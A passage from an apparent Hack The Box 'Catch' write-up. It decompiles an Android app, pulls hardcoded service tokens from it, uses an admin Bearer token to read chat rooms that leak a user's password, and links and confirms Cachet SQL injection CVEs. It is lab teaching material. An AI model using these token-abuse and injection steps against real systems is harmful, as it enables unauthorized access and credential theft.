+</span></pre></table></code></div></div><p>It looked like SSH, and four different HTTP-based services were being hosted on ports 80, 3000, 5000, and 8000.</p><h3 id="port-80---http">Port 80 - HTTP</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_1_website.png" alt="A website with a mobile app download link" /></p><p>There was nothing on this site that worked except the download link in the middle of the page. This link downloaded an Android application <code class="language-plaintext highlighter-rouge">catchv1.0.apk</code> to my system.</p><h3 id="apktool">apktool</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/htb/catch]
+└─$ apktool d catchv1.0.apk 
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+I: Using Apktool 2.6.1-dirty on catchv1.0.apk
+I: Loading resource table...
+I: Decoding AndroidManifest.xml with resources...
+I: Loading resource table from file: /home/zweilos/.local/share/apktool/framework/1.apk
+I: Regular manifest package...
+I: Decoding file-resources...
+I: Decoding values */* XMLs...
+I: Baksmaling classes.dex...
+I: Copying assets and libs...
+I: Copying unknown files...
+I: Copying original files...
+                                                                   
+┌──(zweilos㉿kalimaa)-[~/htb/catch/catchv1.0]
+└─$ ls
+AndroidManifest.xml  apktool.yml  original  res  smali
+</pre></table></code></div></div><p>I used <code class="language-plaintext highlighter-rouge">apktool</code> to decode the apk, then used <code class="language-plaintext highlighter-rouge">openssl</code> to check if there was any interesting information in the certificate file.</p><ul><li>https://stackoverflow.com/questions/11361452/getting-certificate-details-from-an-apk</ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/…/catch/catchv1.0/original/META-INF]
+└─$ openssl pkcs7 -inform DER -in CERT.RSA -noout -print_certs -text  
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number: 741994022 (0x2c39ee26)
+        Signature Algorithm: sha256WithRSAEncryption
+        Issuer: C=30, ST=Greece, L=Athens, O=Catch Global Systems, OU=DevTeam, CN=Will Robinson
+        Validity
+            Not Before: Dec 14 07:24:38 2021 GMT
+            Not After : Dec  4 07:24:38 2061 GMT
+        Subject: C=30, ST=Greece, L=Athens, O=Catch Global Systems, OU=DevTeam, CN=Will Robinson
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                Public-Key: (2048 bit)
+                Modulus:
+                    00:94:c9:89:7e:f7:37:e7:9a:a5:e9:af:d2:6a:58:
+                    a1:5d:ab:7f:ea:a1:c3:1b:cd:6e:8f:bf:76:54:a2:
+                    d5:b1:d6:0d:fa:b7:a3:9a:6a:f8:77:f6:33:0f:66:
+                    1a:24:2d:e8:0d:50:de:77:9c:c5:7e:69:a7:90:79:
+                    b2:16:c5:b7:9c:b2:98:48:43:82:3a:1a:e7:28:d3:
+                    dc:23:4f:2d:4b:f2:cb:f2:2b:d4:54:f3:9b:52:70:
+                    31:8e:70:cd:85:b9:7d:02:6d:4b:18:06:75:c8:9e:
+                    c8:82:8f:c6:29:32:98:8f:f7:66:10:50:55:58:c3:
+                    55:8a:44:0d:8c:11:7a:75:2f:c1:3d:a3:7b:8c:05:
+                    17:f3:63:0a:54:d1:5c:27:51:61:9e:61:62:44:bc:
+                    49:24:24:cd:dc:57:71:25:54:be:2d:23:25:78:db:
+                    14:89:6d:a1:a6:47:ef:2c:28:8f:e6:ae:a6:48:04:
+                    7f:d5:0c:cd:45:c3:71:f3:66:49:22:b4:71:77:de:
+                    39:ee:c2:83:48:f3:eb:08:28:29:fb:56:2f:6e:0c:
+                    69:73:89:44:99:c8:ff:a3:cf:8a:42:77:4a:8d:d0:
+                    80:86:a0:3f:f1:b7:b5:91:6a:37:6d:c5:3a:cc:81:
+                    04:25:f8:8f:46:4f:89:a0:ef:d4:a0:cf:a6:ed:36:
+                    6e:25
+                Exponent: 65537 (0x10001)
+        X509v3 extensions:
+            X509v3 Subject Key Identifier: 
+                BE:97:57:BB:39:14:BC:E5:B6:20:68:6B:4E:91:BD:BF:B2:EB:12:EB
+    Signature Algorithm: sha256WithRSAEncryption
+    Signature Value:
+        73:55:bf:45:9e:59:96:ac:13:b3:f8:f1:e8:63:88:3c:d8:11:
+        a3:98:75:c5:81:f9:bf:c4:f9:8b:95:cd:7d:60:29:87:7e:4b:
+        e7:0c:57:fe:55:2a:3d:90:b4:b2:0d:1d:9a:90:fe:a1:26:92:
+        c2:81:bb:11:d7:91:05:04:59:ca:aa:15:f2:0b:73:48:77:89:
+        d2:89:72:96:76:3b:b1:b1:a4:ff:a5:4f:d2:2a:c4:c3:68:59:
+        8a:22:a2:7d:83:ae:01:d4:0c:db:6b:b6:e1:52:65:c9:b3:91:
+        56:d4:45:04:ee:0b:ce:0d:dd:36:7e:75:9d:c2:2f:07:df:b0:
+        c2:d5:ff:6d:32:88:85:e8:b2:93:23:52:fc:cf:36:93:99:39:
+        6d:e4:dc:56:9f:6e:64:3a:43:b0:3d:5a:8a:c6:c3:91:b0:44:
+        8d:c1:1e:f7:53:c5:26:9c:98:85:f8:70:97:db:e5:23:69:c1:
+        49:1a:f4:a0:f2:7d:a4:1e:a9:b0:ad:fd:22:53:ad:95:44:46:
+        16:fc:a9:fe:57:3c:49:82:a5:d5:9e:12:a4:bf:6e:64:96:2d:
+        96:79:54:eb:a3:e3:7e:e0:e4:04:e0:9a:af:58:da:e9:5f:27:
+        86:64:09:5e:e4:59:43:87:9b:80:3d:37:c2:e5:da:24:b8:1b:
+        b4:69:39:4d
+
+</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">cert.rsa</code> file contained a self-signed certificate with useful information.</p><blockquote><p>Subject: C=30, ST=Greece, L=Athens, O=Catch Global Systems, OU=DevTeam, CN=Will Robinson</p></blockquote><p>I now had a potential username and domain OU to start with.</p><h3 id="apkenumpy">apkenum.py</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/htb/catch/APKEnum]
+└─$ python2 APKEnum.py -p ../catchv1.0.apk
+ 
+                                                                                                                    
+:::'###::::'########::'##:::'##:'########:'##::: ##:'##::::'##:'##::::'##:                                          
+::'## ##::: ##.... ##: ##::'##:: ##.....:: ###:: ##: ##:::: ##: ###::'###:                                          
+:'##:. ##:: ##:::: ##: ##:'##::: ##::::::: ####: ##: ##:::: ##: ####'####:                                          
+'##:::. ##: ########:: #####:::: ######::: ## ## ##: ##:::: ##: ## ### ##:                                          
+ #########: ##.....::: ##. ##::: ##...:::: ##. ####: ##:::: ##: ##. #: ##:                                          
+ ##.... ##: ##:::::::: ##:. ##:: ##::::::: ##:. ###: ##:::: ##: ##:.:: ##:                                          
+ ##:::: ##: ##:::::::: ##::. ##: ########: ##::. ##:. #######:: ##:::: ##:                                          
+..:::::..::..:::::::::..::::..::........::..::::..:::.......:::..:::::..::                                          
+                                                                                                                    
+                  # Developed By Shiv Sahni - @shiv__sahni                                                          
+                                                                                                                    
+Thank you for installing APKEnum
+I: Checking if the APK file path is valid.
+I: APK File Found.
+I: Initiating APK decompilation process
+I: Decompiling the APK file using APKtool.
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+I: Successfully decompiled the application. Proceeding with scanning code.
+
+List of URLs found in the application                                                                               
+
+1. https://status.catch.htb
+2. http://schemas.android.com
+
+No S3 buckets found 
+No S3 websites found
+No IPs found
+No Google MAPS API Keys found 
+Thank You For Using APKEnum
+</pre></table></code></div></div><p>This tool gave me a list of URLs found in the application. Only one was interesting: <code class="language-plaintext highlighter-rouge">https://status.catch.htb</code>, which I added to my hosts file. The site was not reachable from the outside, however (port 443 was not open). It seemed like this must be the site the mobile app was supposed to replace, or maybe to interact with.</p><p>I had noticed that the “future enhancements” listed on the homepage included “Lets-chat” and “Gitea” integration - maybe this app already had these built in? I decided to hunt for anything related to these inside the APK files.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"lets_chat_token"</span><span class="nt">&gt;</span>
+NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==
+</pre></table></code></div></div><p>In the file <code class="language-plaintext highlighter-rouge">catchv1.0/res/values/strings.xml</code> I found a token.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kalimaa)-[~/htb/catch/catchv1.0/res]
+└─$ grep -r token
+values/strings.xml:    <span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"gitea_token"</span><span class="nt">&gt;</span>b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0<span class="nt">&lt;/string&gt;</span>
+values/strings.xml:    <span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"lets_chat_token"</span><span class="nt">&gt;</span>NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==<span class="nt">&lt;/string&gt;</span>
+values/strings.xml:    <span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"slack_token"</span><span class="nt">&gt;</span>xoxp-23984754863-2348975623103<span class="nt">&lt;/string&gt;</span>
+values/public.xml:    <span class="nt">&lt;public</span> <span class="na">type=</span><span class="s">"string"</span> <span class="na">name=</span><span class="s">"gitea_token"</span> <span class="na">id=</span><span class="s">"0x7f0e0028"</span> <span class="nt">/&gt;</span>
+values/public.xml:    <span class="nt">&lt;public</span> <span class="na">type=</span><span class="s">"string"</span> <span class="na">name=</span><span class="s">"lets_chat_token"</span> <span class="na">id=</span><span class="s">"0x7f0e002c"</span> <span class="nt">/&gt;</span>
+values/public.xml:    <span class="nt">&lt;public</span> <span class="na">type=</span><span class="s">"string"</span> <span class="na">name=</span><span class="s">"slack_token"</span> <span class="na">id=</span><span class="s">"0x7f0e0065"</span> <span class="nt">/&gt;</span>
+</pre></table></code></div></div><p>I used grep to see if there were any more tokens and found a couple more tokens related to other services. I couldnt see any way to use these at the moment however, so I went back to the other ports I had found open.</p><h2 id="port-3000---gitea">Port 3000 - Gitea?</h2><p>There wasn’t much here. I did find a cookie called <code class="language-plaintext highlighter-rouge">i_like_gitea</code> in the headers that indicated that this might relate to the Gitea token I had found. Since I had found those three tokens I started looking for a place to use them.</p><h2 id="port-5000---lets-chat-api">Port 5000 - lets-chat API</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_7_lets_chat.png" alt="Let's chat login page" /></p><p>Navigating to the url using port 5000 led me to a login page for something called “Let’s Chat”. Since one of the tokens I had found seemed to be for this application I fired up Burp suite so see if I could use it to authenticate.</p><ul><li>https://github.com/sdelements/lets-chat/wiki/API:-Authentication<blockquote><p>API requests must be authenticated using Basic Authentication or with a Bearer token.</p></blockquote></ul><p>The GitHub page for this application indicated that using a token was preferable to having a username and password, and I hoped that I wouldn’t need credentials if I used this token.</p><blockquote><p>Basic Authentication Use the API token as the username when authenticating. The password can be set to anything, but it must not be blank (simply because most clients require it).</p></blockquote><ul><li>https://swagger.io/docs/specification/authentication/bearer-authentication/</ul><blockquote><p>The client must send this token in the Authorization header when making requests to protected resources:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>Authorization: Bearer &lt;token&gt;
+</pre></table></code></div></div></blockquote><p>According to the website an authorization token had to be in the above format in order to be used.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==
+</pre></table></code></div></div><p>I copied the token into into the header of my requests and began trying to figure out what pages would be useful to enumerate.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_8_5000_lets_chat.png" alt="Dirbuster output showing a list of folders on port 5000" /></p><p>My dirbuster scan of this URL showed a list of pages to check.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_9_letschat_admin.png" alt="Json output showing information for an Administrator" /></p><p>Using Burp I crafted a GET request for the <code class="language-plaintext highlighter-rouge">/accounts</code> page, which gave me a reply in JSON format.</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,</span><span class="nl">"firstName"</span><span class="p">:</span><span class="s2">"Administrator"</span><span class="p">,</span><span class="nl">"lastName"</span><span class="p">:</span><span class="s2">"NA"</span><span class="p">,</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">,</span><span class="nl">"displayName"</span><span class="p">:</span><span class="s2">"Admin"</span><span class="p">,</span><span class="nl">"avatar"</span><span class="p">:</span><span class="s2">"e2b5310ec47bba317c5f1b5889e96f04"</span><span class="p">,</span><span class="nl">"openRooms"</span><span class="p">:[</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">,</span><span class="s2">"61b86b3fd984e2451036eb18"</span><span class="p">,</span><span class="s2">"61b8708efe190b466d476bfb"</span><span class="p">]}</span><span class="w">
+</span></pre></table></code></div></div><p>This output seemed to indicate that the token I had was for the application Administrator and mentioned three open rooms. Since this was a chat application, it seemed likely that I could pull messages out of these rooms if I could connect.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_10_rooms.png" alt="Json output showing the three open chat rooms" /></p><p>The three rooms were Status, Android_dev, and employees. None of the rooms were password enabled.</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="p">[{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b8732cfe190b466d476c02"</span><span class="p">,</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"ah sure!"</span><span class="p">,</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:34:20.749Z"</span><span class="p">,</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86dbdfe190b466d476bf0"</span><span class="p">,</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">
+ </span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b8731ffe190b466d476c01"</span><span class="p">,</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"You should actually include this task to your list as well as a part of quarterly audit"</span><span class="p">,</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:34:07.449Z"</span><span class="p">,</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">
+ </span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b872b9fe190b466d476c00"</span><span class="p">,</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"Also make sure we've our systems, applications and databases up-to-date."</span><span class="p">,</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:32:25.514Z"</span><span class="p">,</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86dbdfe190b466d476bf0"</span><span class="p">,</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">
+ </span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b87282fe190b466d476bff"</span><span class="p">,</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"Excellent! "</span><span class="p">,</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:31:30.403Z"</span><span class="p">,</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">
+ </span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b87277fe190b466d476bfe"</span><span class="p">,</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"Why not. We've this in our todo list for next quarter"</span><span class="p">,</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:31:19.094Z"</span><span class="p">,</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86dbdfe190b466d476bf0"</span><span class="p">,</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">
+ </span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b87241fe190b466d476bfd"</span><span class="p">,</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"@john is it possible to add SSL to our status domain to make sure everything is secure ? "</span><span class="p">,</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:30:25.108Z"</span><span class="p">,</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">
+ </span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b8702dfe190b466d476bfa"</span><span class="p">,</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"Here are the credentials `john :  E}V!mywu_69T4C}W`"</span><span class="p">,</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:21:33.859Z"</span><span class="p">,</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86f15fe190b466d476bf5"</span><span class="p">,</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">
+ </span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b87010fe190b466d476bf9"</span><span class="p">,</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"Sure one sec."</span><span class="p">,</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:21:04.635Z"</span><span class="p">,</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86f15fe190b466d476bf5"</span><span class="p">,</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">
+ </span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b86fb1fe190b466d476bf8"</span><span class="p">,</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"Can you create an account for me ? "</span><span class="p">,</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:19:29.677Z"</span><span class="p">,</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86dbdfe190b466d476bf0"</span><span class="p">,</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">},</span><span class="w">
+ </span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b86f4dfe190b466d476bf6"</span><span class="p">,</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. "</span><span class="p">,</span><span class="nl">"posted"</span><span class="p">:</span><span class="s2">"2021-12-14T10:17:49.761Z"</span><span class="p">,</span><span class="nl">"owner"</span><span class="p">:</span><span class="s2">"61b86f15fe190b466d476bf5"</span><span class="p">,</span><span class="nl">"room"</span><span class="p">:</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">}]</span><span class="w">
+</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_11_john.png" alt="Json output showing the chat history for the status chat room" /></p><p>I was able to get a list of the messages for the <code class="language-plaintext highlighter-rouge">Status</code> room by using the <code class="language-plaintext highlighter-rouge">id</code> number. There were some creds for the user <code class="language-plaintext highlighter-rouge">john</code>!</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="p">[{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b86aead984e2451036eb16"</span><span class="p">,</span><span class="nl">"firstName"</span><span class="p">:</span><span class="s2">"Administrator"</span><span class="p">,</span><span class="nl">"lastName"</span><span class="p">:</span><span class="s2">"NA"</span><span class="p">,</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">,</span><span class="nl">"displayName"</span><span class="p">:</span><span class="s2">"Admin"</span><span class="p">,</span><span class="nl">"avatar"</span><span class="p">:</span><span class="s2">"e2b5310ec47bba317c5f1b5889e96f04"</span><span class="p">,</span><span class="nl">"openRooms"</span><span class="p">:[</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">,</span><span class="s2">"61b86b3fd984e2451036eb18"</span><span class="p">,</span><span class="s2">"61b8708efe190b466d476bfb"</span><span class="p">]},</span><span class="w">
+</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b86dbdfe190b466d476bf0"</span><span class="p">,</span><span class="nl">"firstName"</span><span class="p">:</span><span class="s2">"John"</span><span class="p">,</span><span class="nl">"lastName"</span><span class="p">:</span><span class="s2">"Smith"</span><span class="p">,</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"john"</span><span class="p">,</span><span class="nl">"displayName"</span><span class="p">:</span><span class="s2">"John"</span><span class="p">,</span><span class="nl">"avatar"</span><span class="p">:</span><span class="s2">"f5504305b704452bba9c94e228f271c4"</span><span class="p">,</span><span class="nl">"openRooms"</span><span class="p">:[</span><span class="s2">"61b86b3fd984e2451036eb18"</span><span class="p">,</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">]},</span><span class="w">
+</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b86e40fe190b466d476bf2"</span><span class="p">,</span><span class="nl">"firstName"</span><span class="p">:</span><span class="s2">"Will"</span><span class="p">,</span><span class="nl">"lastName"</span><span class="p">:</span><span class="s2">"Robinson"</span><span class="p">,</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"will"</span><span class="p">,</span><span class="nl">"displayName"</span><span class="p">:</span><span class="s2">"Will"</span><span class="p">,</span><span class="nl">"avatar"</span><span class="p">:</span><span class="s2">"7c6143461e935a67981cc292e53c58fc"</span><span class="p">,</span><span class="nl">"openRooms"</span><span class="p">:[</span><span class="s2">"61b86b3fd984e2451036eb18"</span><span class="p">,</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">]},</span><span class="w">
+</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"61b86f15fe190b466d476bf5"</span><span class="p">,</span><span class="nl">"firstName"</span><span class="p">:</span><span class="s2">"Lucas"</span><span class="p">,</span><span class="nl">"lastName"</span><span class="p">:</span><span class="s2">"NA"</span><span class="p">,</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"lucas"</span><span class="p">,</span><span class="nl">"displayName"</span><span class="p">:</span><span class="s2">"Lucas"</span><span class="p">,</span><span class="nl">"avatar"</span><span class="p">:</span><span class="s2">"b36396794553376673623dc0f6dec9bb"</span><span class="p">,</span><span class="nl">"openRooms"</span><span class="p">:[</span><span class="s2">"61b86b28d984e2451036eb17"</span><span class="p">,</span><span class="s2">"61b86b3fd984e2451036eb18"</span><span class="p">]}]</span><span class="w">
+</span></pre></table></code></div></div><p>Unfortunately, there were no interesting messages in the other two chat rooms. I tried using the creds found in the chat but the password did not work for any of the usernames I had, so I moved on to the next open port I had found.</p><h2 id="port-8000---cachet">Port 8000 - Cachet</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_2_port8000.png" alt="A website with an incident tracker powered by cachet" /></p><p>The page hosted on port 8000 looked to be an incident tracker timeline, but there were no incidents listed at all. I noticed the bottom of the page showed what was used to make the page. It said “Powered by <a href="https://cachethq.io/">Cachet</a>”. I checked the home page for this and found that it was indeed for keeping track of the status of tasks. It was labeled as:</p><blockquote><p>The open source status page system</p></blockquote><p>A search for vulnerabilities related to this system found that three CVE’s had been discovered at one time that could lead to RCE.</p><ul><li>https://portswigger.net/daily-swig/rce-vulnerabilities-in-open-source-software-cachet-could-put-users-at-risk<li>https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/<li>https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html</ul><blockquote><p>Troublesome trio</p><p>The first bug (CVE-2021-39172) is a newline injection that is triggered when users update an instance’s configuration, such as the email settings. It allows attackers to inject new directives and to alter the behavior of core features, ultimately leading to the execution of arbitrary code.</p><p>A second vulnerability (CVE-2021-39174) is also related to this feature, and allows attackers to exfiltrate secrets that are stored in the configuration file – for example, database passwords and framework keys.</p><p>Finally, the last bug (CVE-2021-39173) is “much simpler” according to researchers, and allows an attacker to change the setup process even if the target instance is already fully configured. “That way, attackers can trick the Cachet instance into using an arbitrary database under their control, ultimately leading to arbitrary code execution,” the researchers wrote.</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_3_login.png" alt="Cachet login page" /></p><p>The Dashboard link on the main page led to a login page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_4_subscribe_error.png" alt="Houston we have a problem 500 error" /></p><p>The subscribe link led to error page with a potentially interesting error message.</p><blockquote><p>This error can be identified by e02c6d1c-f391-4b74-a522-f6cd2ceb8c2c. You might want to take a note of this code.</p></blockquote><p>I did some research into the CVEs for this system and found a POC had been written for one of them. I quickly went through the Python exploit and found that it wasn’t very complicated. It was mainly sending some crafted web requests to one of the endpoints</p><ul><li>https://github.com/W0rty/CVE-2021-39165/blob/main/exploit.py</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_5_sqli.png" alt="json output in the browser with a 500 internal server error" /></p><p>First I copied the target url from the exploit</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/catch_6_sqli_confirm.png" alt="Successfully returning calid json after doing SQL injection" /></p><p>I was able to confirm sqli with a test payload</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
